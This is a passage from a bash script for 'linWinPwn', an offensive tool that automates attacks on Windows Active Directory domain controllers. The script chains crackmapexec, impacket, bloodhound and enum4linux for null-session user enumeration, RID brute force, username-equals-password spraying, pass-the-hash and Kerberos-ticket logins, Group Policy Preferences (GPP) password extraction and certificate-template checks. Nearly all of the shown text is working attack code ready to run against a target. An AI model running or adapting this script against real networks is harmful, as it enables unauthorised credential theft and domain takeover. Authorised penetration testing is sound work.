#!/bin/bash
# Title: linWinPwn
# Author: lefayjey

#Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
BLUE='\033[1;34m'
YELLOW='\033[1;33m'
PURPLE='\033[1;35m'
NC='\033[0m'

#Default variables
user=""
password=""
modules="interactive"
output_dir="$(pwd)"
pass_list="/usr/share/wordlists/rockyou.txt"
users_list="/usr/share/seclists/Usernames/cirt-default-usernames.txt"
allservers_bool=true

#Tools variables
python=$(which python3)
scripts_dir="/opt/lwp-scripts"
wordlists_dir="/opt/lwp-wordlists"
impacket_findDelegation=$(which findDelegation.py)
if [ ! -f "${impacket_findDelegation}" ]; then impacket_findDelegation=$(which impacket-findDelegation); fi
impacket_GetUserSPNs=$(which GetUserSPNs.py)
if [ ! -f "${impacket_GetUserSPNs}" ]; then impacket_GetUserSPNs=$(which impacket-GetUserSPNs); fi
impacket_secretsdump=$(which secretsdump.py)
if [ ! -f "${impacket_secretsdump}" ]; then impacket_secretsdump=$(which impacket-secretsdump); fi
impacket_GetNPUsers=$(which GetNPUsers.py)
if [ ! -f "${impacket_GetNPUsers}" ]; then impacket_GetNPUsers=$(which impacket-GetNPUsers); fi
impacket_getTGT=$(which getTGT.py)
if [ ! -f "${impacket_getTGT}" ]; then impacket_getTGT=$(which impacket-getTGT); fi
enum4linux_path=$(which enum4linux-ng)
if [ ! -f "${enum4linux_path}" ]; then enum4linux_path="${python} ${scripts_dir}/enum4linux-ng.py"; fi
bloodhound=$(which bloodhound-python)
ldapdomaindump=$(which ldapdomaindump)
crackmapexec=$(which crackmapexec)
john=$(which john)
smbmap=$(which smbmap)
nmap=$(which nmap)
adidnsdump=$(which adidnsdump)
certi_py=$(which certi.py)
certipy=$(which certipy)
donpapi_dir="$scripts_dir/DonPAPI-main"


print_banner () {
    echo -e "
       _        __        ___       ____                  
      | |(_)_ __\ \      / (_)_ __ |  _ \__      ___ __   
      | || | '_  \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \  
      | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
      |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 

      ${BLUE}linWinPwn: ${CYAN} version 0.5.3
      ${NC}https://github.com/lefayjey/linWinPwn
      ${BLUE}Author: ${CYAN}lefayjey${NC}
      ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
"
}

help_linWinPwn () {
    print_banner
    echo -e "${YELLOW}Parameters${NC}"
    echo -e "-h/--help         Show the help message"
    echo -e "-t/--target       DC IP or target Domain ${RED}[MANDATORY]${NC}"
    echo -e "-u/--username     Username (default: empty)"
    echo -e "-p/--password     Password or LM:NT Hash or location to Kerberos ticket './krb5cc_ticket' (default: empty)" 
    echo -e "-M/--modules      Comma separated modules to run (default: interactive)"
    echo -e "     ${CYAN}Modules available:${NC} interactive, ad_enum, kerberos, scan_shares, vuln_checks, mssql_enum, pwd_dump, user, all"
    echo -e "-o/--output       Output directory (default: current dir)"
    echo -e "--ntp             Run NTP sync with target DC (positional argument: at the end)" 
    echo -e ""
    echo -e "${YELLOW}Example usages${NC}"
    echo -e "$(pwd)/$(basename "$0") -t dc_ip_or_target_domain ${CYAN}(No password for anonymous login)${NC}" >&2;
    echo -e "$(pwd)/$(basename "$0") -t dc_ip_or_target_domain -d domain -u user -p password_or_hash_or_kerbticket" >&2;
    echo -e ""
}

args=()
while test $# -gt 0; do
        case $1 in
            -d) domain="${2}"; shift;;
            --domain) domain="${2}"; shift;;
            -u) user="${2}"; shift;; #leave empty for anonymous login
            --user) user="${2}"; shift;; #leave empty for anonymous login
            -p) password="${2}"; shift;; #password or NTLM hash or location of krb5cc ticket
            --password) password="${2}"; shift;; #password or NTLM hash or location of krb5cc ticket
            -t) dc_ip="${2}"; shift;; #mandatory
            --target) dc_ip="${2}"; shift;; #mandatory
            -M) modules="${2}"; shift;; #comma separated modules to run
            --Modules) modules="${2}"; shift;; #comma separated modules to run
            -o) output_dir="${2}"; shift;;
            --output) output_dir="${2}"; shift;;
            --ntp) echo -e "${BLUE}[*] NTP sync with target DC... ${NC}"; sudo timedatectl set-ntp 0; sudo ntpdate ${dc_ip}; shift;;
            -h) help_linWinPwn; exit;;
            --help) help_linWinPwn; exit;;
            \?) echo -e "Unknown option: ${2}" >&2; exit 1;;
            *) args+=($1);;
        esac
        shift
done
set -- "${args[@]}"

prepare (){
    if [ -z "$dc_ip" ] ; then
        echo -e "${RED}[-] Missing target... ${NC}"
        echo -e "Use -h for help"
        exit 1
    fi

    echo -e "${GREEN}[+] $(date)${NC}"

    if [ ! -f "${crackmapexec}" ] ; then
        echo -e "${RED}[-] Please ensure crackmapexec is installed and try again... ${NC}"
        exit 1
    else
        dc_info=$(${crackmapexec} smb ${dc_ip})
    fi

    dc_NETBIOS=$(echo $dc_info| cut -d ":" -f 2 | sed "s/) (domain//g" | head -n 1)
    dc_domain=$(echo $dc_info | cut -d ":" -f 3 | sed "s/) (signing//g"| head -n 1)
    dc_FQDN=${dc_NETBIOS}"."${dc_domain}
    kdc=""

    if [ -z "$dc_domain" ] ; then
        echo -e "${RED}[-] Error connecting to target! Please ensure the target is a Domain Controller and try again... ${NC}"
        exit 1
    elif [ -z "$domain" ] ; then
        domain=${dc_domain}
    fi

    nullsess_bool=false
    hash_bool=false
    kerb_bool=false

    if [ "${user}" == "" ]; then user_out="null"; else user_out=${user}; fi
    output_dir="${output_dir}/linWinPwn_${dc_domain}_${user_out}"

    servers_ip_list="${output_dir}/DomainRecon/ip_list_${dc_domain}.txt"
    dc_ip_list="${output_dir}/DomainRecon/ip_list_dc_${dc_domain}.txt"
    sql_ip_list="${output_dir}/DomainRecon/ip_list_sql_${dc_domain}.txt"
    servers_list="${output_dir}/DomainRecon/server_custom_list_${dc_domain}.txt"
    dc_hostname_list="${output_dir}/DomainRecon/server_list_dc_${dc_domain}.txt"
    sql_hostname_list="${output_dir}/DomainRecon/server_list_sql_${dc_domain}.txt"
    dns_records="${output_dir}/DomainRecon/dns_records_${dc_domain}.csv"

    if [ ! -f "${users_list}" ] ; then
        echo -e "${RED}[-] Users list file not found${NC}"
    fi

    if [ ! -f "${pass_list}" ] ; then
        echo -e "${RED}[-] Passwords list file not found${NC}"
    fi

    #Check if null session is used
    if [ "${user}" == "" ]  && [ "${password}" == "" ]; then
        nullsess_bool=true
        target=${dc_ip}
        target_dc=${dc_ip_list}
        target_sql=${sql_ip_list}
        argument_cme=""
        argument_smbmap=""
        auth_string="${YELLOW}[i]${NC} Authentication method: null session ${NC}"
    
    #Check if username is not provided
    elif [ "${user}" == "" ]; then
        echo -e "${RED}[i]${NC} Please specify username and try again..."
        exit 1
    
    #Check if empty password is used
    elif [ "${password}" == "" ]; then
        target=${dc_ip}
        target_dc=${dc_ip_list}
        target_sql=${sql_ip_list}
        argument_cme="-d ${domain} -u ${user} -p ''"
        argument_ldapdns="-u ${domain}\\${user} -p ''"
        argument_smbmap="-d ${domain} -u ${user} -p ''"
        argument_imp="${domain}/${user}:''"
        argument_bhd="-u ${user}@${domain} -p ''"
        argument_windap="-d ${domain} -u ${user} -p ''"
        argument_certipy="-u ${user}@${domain} -p ''"
        auth_string="${YELLOW}[i]${NC} Authentication method: ${user} with empty password ${NC}"
    
    #Check if NTLM hash is used, and complete with empty LM hash
    elif ([ "${#password}" -eq 65 ] && [ "$(expr substr $password 33 1)" == ":" ]) || ([ "${#password}" -eq 33 ] && [ "$(expr substr $password 1 1)" == ":" ]) ; then
        hash_bool=true
        if [ "$(echo $password | cut -d ":" -f 1)" == "" ]; then
            password="aad3b435b51404eeaad3b435b51404ee"$password
        fi
        target=${dc_ip}
        target_dc=${dc_ip_list}
        target_sql=${sql_ip_list}
        argument_cme="-d ${domain} -u ${user} -H ${password}"
        argument_ldapdns="-u ${domain}\\${user} -p ${password}"
        argument_smbmap="-d ${domain} -u ${user} -p ${password}"
        argument_imp=" -hashes ${password} ${domain}/${user}"
        argument_donpapi=" -H ${password} ${domain}/${user}"
        argument_bhd="-u ${user}@${domain} --hashes ${password}"
        argument_silenthd="-u ${user} --hashes ${password}"
        argument_windap="-d ${domain} -u ${user} --hash ${password}"
        argument_certipy="-u ${user}@${domain} -hashes ${password}"
        auth_string="${YELLOW}[i]${NC} Authentication method: NTLM hash of ${user}"
    
    #Check if kerberos ticket is used
    elif [ -f "${password}" ] ; then
        kerb_bool=true
        target=${dc_domain}
        target_dc=${dc_hostname_list}
        target_sql=${sql_hostname_list}
        export KRB5CCNAME=$(realpath $password)
        argument_cme="-d ${domain} -u ${user} -k"
        argument_imp="-k -no-pass ${domain}/${user}"
        argument_donpapi="-k -no-pass ${domain}/${user}"
        argument_bhd="-u ${user}@${domain} -k"
        argument_certipy="-u ${user}@${domain} -k -no-pass"
        kdc="$(echo $dc_FQDN | cut -d '.' -f 1)."
        auth_string="${YELLOW}[i]${NC} Authentication method: Kerberos Ticket of $user located at $(realpath $password)"
    
    #Password authentication is used
    else
        target=${dc_ip}
        target_dc=${dc_ip_list}
        target_sql=${sql_ip_list}
        argument_cme="-d ${domain} -u ${user} -p ${password}"
        argument_ldapdns="-u ${domain}\\${user} -p ${password}"
        argument_smbmap="-d ${domain} -u ${user} -p ${password}"
        argument_imp="${domain}/${user}:${password}"
        argument_donpapi="${domain}/${user}:${password}"
        argument_bhd="-u ${user}@${domain} -p ${password}"
        argument_silenthd="-u ${user} -p ${password}"
        argument_windap="-d ${domain} -u ${user} -p ${password}"
        argument_certipy="-u ${user}@${domain} -p ${password}"
        argument_enum4linux="-w ${domain} -u ${user} -p ${password}"
        auth_string="${YELLOW}[i]${NC} Authentication: password of ${user}"
    fi

    if [ "${nullsess_bool}" == false ] ; then
        auth_check=$(${crackmapexec} smb ${target} ${argument_cme} | grep "\[-\]")
        if [ ! -z "$auth_check" ] ; then
            echo -e "${RED}[-] Error authenticating to domain! Please check your credentials and try again... ${NC}"
            exit 1
        fi
    fi

    mkdir -p ${output_dir}/Scans
    mkdir -p ${output_dir}/DomainRecon/BloodHound
    mkdir -p ${output_dir}/DomainRecon/SilentHound
    mkdir -p ${output_dir}/DomainRecon/LDAPDump
    mkdir -p ${output_dir}/DomainRecon/ADCS
    mkdir -p ${output_dir}/Kerberos
    mkdir -p ${output_dir}/Shares/SharesDump
    mkdir -p ${output_dir}/Credentials
    mkdir -p ${output_dir}/Vulnerabilities
    mkdir -p /tmp/shared
    echo -e ""
    
    if ! grep -q ${dc_ip} ${servers_ip_list} 2>/dev/null; then
        echo ${dc_ip} >> ${servers_ip_list}
    fi
    if ! grep -q ${dc_ip} ${dc_ip_list} 2>/dev/null; then
        echo ${dc_ip} >> ${dc_ip_list}
    fi
    if ! grep -q ${dc_FQDN} ${dc_hostname_list} 2>/dev/null; then
        echo ${dc_FQDN} >> ${dc_hostname_list}
    fi    
    
}

dns_enum () {
    if [ ! -f "${adidnsdump}" ] ; then
        echo -e "${RED}[-] Please verify the installation of adidnsdump${NC}"
        echo -e ""
    else
        echo -e "${BLUE}[*] DNS dump using adidnsdump${NC}"
        if [ ! -f "${dns_records}" ]; then
            if [ "${nullsess_bool}" == true ] ; then
                echo -e "${PURPLE}[-] adidnsdump requires credentials${NC}"
            elif [ "${kerb_bool}" == true ] ; then
                echo -e "${PURPLE}[-] adidnsdump does not support kerberos tickets${NC}"
            else
                ${adidnsdump} ${argument_ldapdns} --dns-tcp ${dc_ip}
                mv records.csv ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null
                /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 > ${servers_ip_list}
                /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "A," | cut -d "," -f 3 > ${dc_ip_list}
                /bin/cat ${output_dir}/DomainRecon/dns_records_${dc_domain}.csv 2>/dev/null | grep "@" | grep "NS," | cut -d "," -f 3 > ${dc_hostname_list}
            fi
        else
            echo -e "${YELLOW}[i] DNS dump found ${NC}"
        fi
    fi
    echo -e ""
}

smb_scan () {
    if [ "${allservers_bool}" == true ] ; then
        servers_scan_list=${servers_ip_list}
        echo -e "${YELLOW}[i] Scanning all domain servers ${NC}"
    else
        servers_scan_list=${servers_list}
        echo -e "${YELLOW}[i] Scanning servers in ${servers_list} ${NC}"
    fi

    if [ ! -f "${nmap}" ]; then
        echo -e "${RED}[-] Please verify the installation of nmap ${NC}"
    else
        if [ "${allservers_bool}" == true ] ; then
            servers_smb_list="${output_dir}/Scans/servers_all_smb_${dc_domain}.txt"
            if [ ! -f "${servers_smb_list}" ]; then
                ${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt 1>/dev/null 2>&1
                grep -a "open" ${output_dir}/Scans/nmap_smb_scan_all_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
            else
                echo -e "${YELLOW}[i] SMB nmap scan results found ${NC}"
            fi
        else
            servers_smb_list="${output_dir}/Scans/servers_custom_smb_${dc_domain}.txt"
            ${nmap} -p 445 -Pn -sT -n -iL ${servers_scan_list} -oG ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt 1>/dev/null 2>&1
            grep -a "open" ${output_dir}/Scans/nmap_smb_scan_custom_${dc_domain}.txt | cut -d " " -f 2 > ${servers_smb_list}
        fi
    fi
}

bhd_enum () {
    if [ ! -f "${bloodhound}" ] ; then
        echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
    else
        echo -e "${BLUE}[*] BloodHound Enumeration using all collection methods (Noisy!)${NC}"
        if [ -n "$(ls -A ${output_dir}/DomainRecon/BloodHound/ 2>/dev/null)" ] ; then
            echo -e "${YELLOW}[i] BloodHound results found. ${NC}"
        else
            if [ "${nullsess_bool}" == true ] ; then
                echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
            else
                current_dir=$(pwd)
                cd ${output_dir}/DomainRecon/BloodHound
                ${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip
                cd ${current_dir}
            fi
        fi
    fi
    echo -e ""
}

bhd_enum_dconly () {
    if [ ! -f "${bloodhound}" ] ; then
        echo -e "${RED}[-] Please verify the installation of bloodhound${NC}"
    else
        echo -e "${BLUE}[*] BloodHound Users Enumeration (Null session) using DCOnly${NC}"
        if [ -n "$(ls -A ${output_dir}/DomainRecon/BloodHound/ 2>/dev/null)" ] ; then
            echo -e "${YELLOW}[i] BloodHound results found. ${NC}"
        else
            if [ "${nullsess_bool}" == true ] ; then
                echo -e "${PURPLE}[-] BloodHound requires credentials${NC}"
            else 
                current_dir=$(pwd)
                cd ${output_dir}/DomainRecon/BloodHound
                ${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dc_ip} --dns-timeout 5 --dns-tcp --zip
                cd ${current_dir}
            fi
        fi
    fi
    echo -e ""
}

ldapdomain_enum () {
    if [ ! -f "${ldapdomaindump}" ] ; then
        echo -e "${RED}[-] Please verify the installation of ldapdomaindump${NC}"
    elif [ -n "$(ls -A ${output_dir}/DomainRecon/LDAPDump/ 2>/dev/null)" ] ; then
        echo -e "${YELLOW}[i] ldapdomain results found ${NC}"
    else
        echo -e "${BLUE}[*] ldapdomain Enumeration${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            ${ldapdomaindump} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDump 2>/dev/null
        elif [ "${kerb_bool}" == true ] ; then
                echo -e "${PURPLE}[-] ldapdomain does not support kerberos tickets${NC}"
        else
            ${ldapdomaindump} ${argument_ldapdns} ldap://${dc_ip} --no-json -o ${output_dir}/DomainRecon/LDAPDump 2>/dev/null
        fi

        #Parsing user and computer lists
        /bin/cat ${output_dir}/DomainRecon/LDAPDump/${dc_domain}/domain_users.grep 2>/dev/null | awk -F '\t' '{ print $3 }'| grep -v "sAMAccountName" | sort -u > ${output_dir}/DomainRecon/users_list_ldap_${dc_domain}.txt 2>&1
        /bin/cat ${output_dir}/DomainRecon/LDAPDump/${dc_domain}/domain_computers.grep 2>/dev/null | awk -F '\t' '{ print $3 }' | grep -v "dNSHostName" | sort -u > ${output_dir}/DomainRecon/servers_list_${dc_domain}.txt 2>&1
        echo ${dc_FQDN} >> ${output_dir}/DomainRecon/servers_list_${dc_domain}.txt 2>&1
    fi
    echo -e ""
}

silenthound_enum () {
    if [ ! -f "${scripts_dir}/silenthound.py" ]; then
        echo -e "${RED}[-] Please verify the location of silenthound${NC}"
    else
        echo -e "${BLUE}[*] SilentHound Enumeration${NC}"
        if [ "${kerb_bool}" == false ] && [ "${nullsess_bool}" == false ]; then
            current_dir=$(pwd)
            cd ${output_dir}/DomainRecon/SilentHound
            ${python} ${scripts_dir}/silenthound.py ${argument_silenthd} ${dc_ip} ${dc_domain} -g -n --kerberoast -o ${output_dir}/DomainRecon/SilentHound/${dc_domain} > ${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt 2>/dev/null
            cd ${current_dir}
            echo -e "${GREEN}[+] SilentHound enumeration complete.${NC}"
        else
                echo -e "${PURPLE}[-] SilentHound does not support null sessions or kerberos tickets${NC}"
        fi
    fi
    echo -e ""
}

windapsearch_enum () {
    if [ ! -f "${scripts_dir}/windapsearch" ]; then
        echo -e "${RED}[-] Please verify the location of windapsearch${NC}"
    else
        echo -e "${BLUE}[*] windapsearch Enumeration${NC}"
        if [ "${kerb_bool}" == false ]; then
            ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} -m users > ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt 2>/dev/null
            ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} -m computers > ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt
            ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} -m groups > ${output_dir}/DomainRecon/windapsearch_groups_${dc_domain}.txt
            ${scripts_dir}/windapsearch ${argument_windap} --dc ${dc_ip} -m privileged-users > ${output_dir}/DomainRecon/windapsearch_privusers_${dc_domain}.txt
            #Parsing user and computer lists
            /bin/cat ${output_dir}/DomainRecon/windapsearch_users_${dc_domain}.txt 2>/dev/null | grep "cn:" | sed "s/cn: //g" | sort -u > ${output_dir}/DomainRecon/users_list_windap_${dc_domain}.txt 2>&1
            /bin/cat ${output_dir}/DomainRecon/windapsearch_servers_${dc_domain}.txt 2>/dev/null | grep "cn:" | sed "s/cn: //g" | sort -u > ${output_dir}/DomainRecon/servers_list_windap_${dc_domain}.txt 2>&1
            /bin/cat ${output_dir}/DomainRecon/windapsearch_groups_${dc_domain}.txt 2>/dev/null | grep "cn:" | sed "s/cn: //g" | sort -u > ${output_dir}/DomainRecon/groups_list_windap_${dc_domain}.txt 2>&1
            echo ${dc_FQDN} >> ${output_dir}/DomainRecon/servers_list_${dc_domain}.txt 2>&1
            echo -e "${GREEN}[+] windapsearch enumeration of users, servers, groups complete.${NC}"
        else
                echo -e "${PURPLE}[-] windapsearch does not support kerberos tickets${NC}"
        fi
    fi
    echo -e ""
}   

enum4linux_enum () {
    if [ ! -f "${enum4linux_path}" ] ; then
        echo -e "${RED}[-] Please verify the installation of enum4linux-ng${NC}"
    else
        echo -e "${BLUE}[*] enum4linux Enumeration${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${CYAN}[*] Empty username/password${NC}"
            ${enum4linux_path} -A ${dc_ip} | tee ${output_dir}/DomainRecon/enum4linux_null_${dc_domain}.txt 2>&1
            #Parsing user lists
            /bin/cat ${output_dir}/DomainRecon/enum4linux_null_${dc_domain}.txt 2>/dev/null | grep "username:" | sed "s/  username: //g" | sort -u > ${output_dir}/DomainRecon/users_list_enum4linux_nullsess_${dc_domain}.txt 2>&1
            echo -e "${CYAN}[*] Guest with empty password${NC}"
            ${enum4linux_path} -A ${dc_ip} -u 'Guest' -p '' | tee ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt 2>&1
            #Parsing user lists
            /bin/cat ${output_dir}/DomainRecon/enum4linux_guest_${dc_domain}.txt 2>/dev/null | grep "username:" | sed "s/  username: //g" | sort -u > ${output_dir}/DomainRecon/users_list_enum4linux_guest_${dc_domain}.txt 2>&1
        elif [ "${kerb_bool}" == true ] || [ "${hash_bool}" == true ] ; then
                echo -e "${PURPLE}[-] enum4linux does not support kerberos tickets nor PtH${NC}"
        else
            ${enum4linux_path} -A ${argument_enum4linux} ${dc_ip} | tee ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>&1
            #Parsing user lists
            /bin/cat ${output_dir}/DomainRecon/enum4linux_${dc_domain}.txt 2>/dev/null | grep "username:" | sed "s/  username: //g" | sort -u > ${output_dir}/DomainRecon/users_list_enum4linux_${dc_domain}.txt 2>&1
        fi
    fi
    echo -e ""
}

ridbrute_attack () {
    echo -e "${BLUE}[*] RID Brute Force (Null session)${NC}"
    if [ "${nullsess_bool}" == true ] ; then
        ${crackmapexec} smb ${target} ${argument_cme} --rid-brute 2>/dev/null > ${output_dir}/DomainRecon/cme_rid_brute_${dc_domain}.txt
        #Parsing user lists
        /bin/cat ${output_dir}/DomainRecon/rid_brute_${dc_domain}.txt 2>/dev/null | grep "SidTypeUser" | cut -d ":" -f 2 | cut -d "\\" -f 2 | sed "s/ (SidTypeUser)\x1B\[0m//g" > ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt 2>&1
        count=$(wc -l ${output_dir}/DomainRecon/users_list_ridbrute_${dc_domain}.txt | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using RID Brute Force"
    else
        echo -e "${PURPLE}[-] Null session RID brute force can only be executed without credentials${NC}"
    fi
    echo -e ""
}

users_enum () {
    if [ "${nullsess_bool}" == true ] ; then
        echo -e "${BLUE}[*] Users Enumeration (Null session)${NC}"
        ${crackmapexec} smb ${target} ${argument_cme} --users > ${output_dir}/DomainRecon/cme_users_nullsess_smb_${dc_domain}.txt
        ${crackmapexec} ldap ${target} -u '' -p '' --users --kdcHost "${kdc}${dc_domain}" > ${output_dir}/DomainRecon/cme_users_nullsess_ldap_${dc_domain}.txt
        #Parsing user lists
        /bin/cat ${output_dir}/DomainRecon/cme_users_nullsess_smb_${dc_domain}.txt 2>/dev/null | grep "${dc_domain}" | grep -v ":" | cut -d "\\" -f 2 | cut -d " " -f 1 > ${output_dir}/DomainRecon/users_list_cme_nullsess_${dc_domain}.txt 2>&1
        count=$(cat ${output_dir}/DomainRecon/users_list_cme_nullsess_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using RPC User Enum"
    else
        echo -e "${BLUE}[*] Users Enumeration (authenticated)${NC}"
        ${crackmapexec} smb ${target} ${argument_cme} --users > ${output_dir}/DomainRecon/cme_users_auth_${dc_domain}.txt
        #Parsing user lists
        /bin/cat ${output_dir}/DomainRecon/cme_users_auth_${dc_domain}.txt 2>/dev/null | grep "${dc_domain}\\\\" | cut -d "\\" -f 2 | cut -d " " -f 1 | cut -d ":" -f 1 > ${output_dir}/DomainRecon/users_list_cme_${dc_domain}.txt 2>&1
        count=$(cat ${output_dir}/DomainRecon/users_list_cme_${dc_domain}.txt | sort -u | wc -l | cut -d " " -f 1)
        echo -e "${GREEN}[+] Found ${count} users using RPC User Enum"
    fi
    echo -e ""
}

userpass_cme_check () {
    known_users_list="${output_dir}/DomainRecon/users_list_sorted_${dc_domain}.txt"
    /bin/cat ${output_dir}/DomainRecon/users_list_*_${dc_domain}.txt 2>/dev/null | sort -uf > ${known_users_list} 2>&1
    if [ ! -s "${known_users_list}" ] ; then
        users_enum
    fi
    echo -e "${BLUE}[*] Crackmapexec User=Pass Check (Noisy!)${NC}"
    echo -e "${YELLOW}[i] Finding users with Password = username using crackmapexec. This may take a while...${NC}"
    ${crackmapexec} smb ${target} -u ${known_users_list} -p ${known_users_list} --no-bruteforce --continue-on-success 2>/dev/null > ${output_dir}/DomainRecon/cme_userpass_output_${dc_domain}.txt 2>&1
    /bin/cat ${output_dir}/DomainRecon/cme_userpass_output_${dc_domain}.txt 2>&1 | grep "\[+\]" | cut -d "\\" -f 2 | cut -d " " -f 1 > "${output_dir}/DomainRecon/user_eq_pass_valid_cme_${dc_domain}.txt"
    if [ -s "${output_dir}/DomainRecon/user_eq_pass_valid_cme_${dc_domain}.txt" ] ; then
        echo -e "${GREEN}[+] Printing accounts with username=password...${NC}"
        /bin/cat ${output_dir}/DomainRecon/user_eq_pass_valid_cme_${dc_domain}.txt 2>/dev/null
    else
        echo -e "${PURPLE}[-] No accounts with username=password found${NC}"
    fi
    echo -e ""
}

passpol_enum () {
    echo -e "${BLUE}[*] Password Policy Enumeration${NC}"
    ${crackmapexec} smb ${target} ${argument_cme} --pass-pol 2>/dev/null | tee ${output_dir}/DomainRecon/cme_passpol_output_${dc_domain}.txt 2>&1
    echo -e ""
}

gpp_enum () {
    echo -e "${BLUE}[*] GPP Enumeration${NC}"
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M gpp_autologin 2>/dev/null | tee ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
    ${crackmapexec} smb ${target_dc} ${argument_cme} -M gpp_password 2>/dev/null | tee -a ${output_dir}/DomainRecon/cme_gpp_output_${dc_domain}.txt 2>&1
    echo -e ""
}

passnotreq_enum () {
    echo -e "${BLUE}[*] Password not required Enumeration${NC}"
    ${crackmapexec} ldap ${target_dc} ${argument_cme} --password-not-required --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_passnotrequired_output_${dc_domain}.txt 2>&1
    echo -e ""
}

adcs_enum () {
    echo -e "${BLUE}[*] ADCS Enumeration${NC}"
    ${crackmapexec} ldap ${target} ${argument_cme} -M adcs --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/ADCS/cme_adcs_output_${dc_domain}.txt 2>&1
    echo -e ""
}

passdesc_enum () {
    echo -e "${BLUE}[*] Users Description containing word: pass${NC}"
    ${crackmapexec} ldap ${target} ${argument_cme} -M get-desc-users --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>&1
    /bin/cat ${output_dir}/DomainRecon/cme_get-desc-users_pass_output_${dc_domain}.txt 2>/dev/null | grep -i "pass" > ${output_dir}/DomainRecon/cme_get-desc-users_pass_results_${dc_domain}.txt 2>&1
    echo -e ""
}

macq_enum () {
    echo -e "${BLUE}[*] Get MachineAccountQuota${NC}"
    ${crackmapexec} ldap ${target} ${argument_cme} -M MAQ --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_MachineAccountQuota_output_${dc_domain}.txt 2>&1
    echo -e ""
}

ldapsign_enum () {
    echo -e "${BLUE}[*] LDAP-signing check${NC}"
    ${crackmapexec} ldap ${target_dc} ${argument_cme} -M ldap-signing --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_ldap-signing_output_${dc_domain}.txt 2>&1
    ${crackmapexec} ldap ${target_dc} ${argument_cme} -M ldap-checker --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_ldap-checker_output_${dc_domain}.txt 2>&1
    echo -e ""
}

deleg_enum_cme () {
    echo -e "${BLUE}[*] Trusted-for-delegation check (cme)${NC}"
    ${crackmapexec} ldap ${target_dc} ${argument_cme} --trusted-for-delegation --kdcHost "${kdc}${dc_domain}" 2>/dev/null | tee ${output_dir}/DomainRecon/cme_trusted-for-delegation_output_${dc_domain}.txt 2>&1
    echo -e ""
}

deleg_enum_imp () {
    if [ ! -f "${impacket_findDelegation}" ] ; then
        echo -e "${RED}[-] findDelegation.py not found! Please verify the installation of impacket${NC}"
    else
        echo -e "${BLUE}[*] Impacket findDelegation Enumeration${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] impacket requires credentials${NC}"
        else
            ${impacket_findDelegation} ${argument_imp} -dc-ip ${dc_ip} -target-domain ${dc_domain} | tee ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt
            if grep -q 'error' ${output_dir}/DomainRecon/impacket_findDelegation_output_${dc_domain}.txt; then
                echo -e "${RED}[-] Errors during Delegation enum... ${NC}"
            fi
        fi
    fi
    echo -e ""
}

certi_py_enum () {
    if [[ ! -f "${certi_py}" ]] && [[ ! -f "${impacket_getTGT}" ]] ; then
        echo -e "${RED}[-] Please verify the installation of certi.py and the location of getTGT.py${NC}"
    else
        echo -e "${BLUE}[*] certi.py Enumeration${NC}"
        if [ "${nullsess_bool}" == true ] ; then
            echo -e "${PURPLE}[-] certi.py requires credentials${NC}"
        else
            if  [ "${kerb_bool}" == false ] ; then
                current_dir=$(pwd)
                cd ${output_dir}/Credentials
                ${impacket_getTGT} ${argument_imp} -dc-ip ${dc_ip}
                cd ${current_dir}
                export KRB5CCNAME="${output_dir}/Credentials/${user}.ccache"
            fi
            ${certi_py} list ${domain}/${user} -k -n --dc-ip ${dc_ip} --class ca | tee ${output_dir}/DomainRecon/ADCS/certi.py_CA_output_${dc_domain}.txt
            ${certi_py} list ${domain}/${user} -k -n --dc-ip ${dc_ip} --class service | tee ${output_dir}/DomainRecon/ADCS/certi.py_CAServices_output_${dc_domain}.txt
            ${certi_py} list ${domain}/${user} -k -n --dc-ip ${dc_ip} --vuln --enabled | tee ${output_dir}/DomainRecon/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt
        fi
    fi
